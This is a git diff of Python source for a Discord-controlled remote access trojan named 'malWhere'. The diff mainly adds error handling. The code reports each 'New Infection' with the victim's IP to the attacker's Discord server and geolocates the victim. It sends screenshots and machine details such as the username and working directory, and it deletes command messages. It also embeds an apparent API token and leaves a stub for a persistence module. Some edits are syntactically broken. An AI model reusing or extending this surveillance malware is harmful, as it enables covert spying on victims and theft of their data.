@@ -48,39 +48,46 @@ ip=response["ip"]
 ip4chan=ip.replace(".","")
 
 @malWhere.event
-async def on_ready():  
-  print(f"logged in as {malWhere}")
-  guild = malWhere.get_guild(874824520467349504)
-  infectionschannel=malWhere.get_channel(874824520693874756)
-  #insert peristance module for windows
-  #clone necesssary files into startup 
-  existing_channel = discord.utils.get(guild.channels, name=ip4chan)
-  if not existing_channel:
-    embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
-    await guild.create_text_channel(ip)
-    await infectionschannel.send(embed=embed)
-  else:
-    embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands"))
-    await infectionschannel.send(embed=embed)
+async def on_ready():
+  try:
+    print(f"logged in as {malWhere}")
+    guild = malWhere.get_guild(874824520467349504)
+    infectionschannel=malWhere.get_channel(874824520693874756)
+    #insert peristance module for windows
+    #clone necesssary files into startup 
+    existing_channel = discord.utils.get(guild.channels, name=ip4chan)
+    if not existing_channel:
+      embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
+      await guild.create_text_channel(ip)
+      await infectionschannel.send(embed=embed)
+    else:
+      embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands"))
+      await infectionschannel.send(embed=embed)
+  except:
+    ctx.message.send("An Error Has Occured Please Try Again")
 
 @malWhere.command()
 async def geolocate(ctx):
-  if str(ctx.channel)==(ip4chan):
-    r = requests.get(f'http://ipinfo.io/{ip}?token=51030d1b61679e')
-    response=r.json()
-    embed=discord.Embed(title="Location Data", url=f"https://www.google.com/maps/search/4{response['loc']}/@{response['loc']},17z", description=f"{ip}'s Location data", color=0xFF5733)
-    embed.add_field(name="IP", value=ip, inline=False)
-    embed.add_field(name="COUNTRY", value=response["country"], inline=False)
-    embed.add_field(name="REGION", value=response["region"], inline=False)
-    embed.add_field(name="CITY", value=response["city"], inline=False)
-    embed.add_field(name="POST CODE", value=response["postal"], inline=False)
-    await ctx.send(embed=embed)
-    await ctx.message.delete()
-  else:
-    await ctx.channel.send("wrong channel skid")
+  try:
+    if str(ctx.channel)==(ip4chan):
+      r = requests.get(f'http://ipinfo.io/{ip}?token=51030d1b61679e')
+      response=r.json()
+      embed=discord.Embed(title="Location Data", url=f"https://www.google.com/maps/search/4{response['loc']}/@{response['loc']},17z", description=f"{ip}'s Location data", color=0xFF5733)
+      embed.add_field(name="IP", value=ip, inline=False)
+      embed.add_field(name="COUNTRY", value=response["country"], inline=False)
+      embed.add_field(name="REGION", value=response["region"], inline=False)
+      embed.add_field(name="CITY", value=response["city"], inline=False)
+      embed.add_field(name="POST CODE", value=response["postal"], inline=False)
+      await ctx.send(embed=embed)
+      await ctx.message.delete()
+    else:
+      await ctx.channel.send("wrong channel skid")
+  except:
+    ctx.message.send("An Error Has Occured Please Try Again")
 
 @malWhere.command()
 async def screenshot(ctx):
+  try:
     guild = malWhere.get_guild(874824520467349504)
     existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
     channel_id = existing_channel.id
@@ -92,33 +99,39 @@ async def screenshot(ctx):
       picture = discord.File(f)
       mediachan=malWhere.get_channel(channel_id)
       await mediachan.send(file=picture)
-      
-@malWhere.command()
-async def pcinfo(ctx):
-  if str(ctx.channel)==(ip4chan):
-    battery = psutil.sensors_battery()
-    plugged = battery.power_plugged
-    percent = str(battery.percent)
-    plugged = "Plugged In" if plugged else "Not Plugged In"
-    embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
-    embed.add_field(name="Username", value=getpass.getuser(), inline=False)
-    embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
-    embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
-    embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
-    await ctx.send(embed=embed)
-    await ctx.message.delete()
-  else:
-    await ctx.channel.send("wrong channel skid")
+  except:
+    ctx.message.send("An Error Has Occured Please Try Again")
 
 @malWhere.command()
+async def pcinfo(ctx):
+  try:
+    if str(ctx.channel)==(ip4chan):
+      battery = psutil.sensors_battery()
+      plugged = battery.power_plugged
+      percent = str(battery.percent)
+      plugged = "Plugged In" if plugged else "Not Plugged In"
+      embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
+      embed.add_field(name="Username", value=getpass.getuser(), inline=False)
+      embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
+      embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
+      embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
+      await ctx.send(embed=embed)
+      await ctx.message.delete()
+    else:
+      await ctx.channel.send("wrong channel skid")
+  except:
+    ctx.message.send("An Error Has Occured Please Try Again")
+  
+
+@malWhere.command():
 async def rickroll(ctx):
   try:
     os.popen("chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     os.popen("firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     os.popen("opera https://www.youtube.com/watch?v=dQw4w9WgXcQ")
     os.popen("brave https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+    ctx.message.delete()
   except:
-    pass
-  ctx.message.delete()
+    ctx.message.send("An Error Has Occured Please Try Again")
 
 malWhere.run(TOKEN)
